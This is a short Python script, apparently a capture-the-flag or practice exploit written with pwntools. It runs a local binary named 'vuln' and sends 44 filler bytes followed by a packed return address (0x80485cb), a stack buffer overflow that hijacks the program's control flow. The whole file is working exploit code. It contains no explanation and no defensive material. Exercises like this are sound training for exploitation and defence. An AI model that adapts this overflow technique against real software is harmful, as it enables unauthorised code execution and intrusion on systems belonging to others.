#!/usr/bin/env python

from pwn import *

p = process("./vuln")
p.recvuntil("Please enter your string: \n")

payload = (
    "A" * 44 +
    p32(0x80485cb)
)
p.sendline(payload)

print(p.recvall())
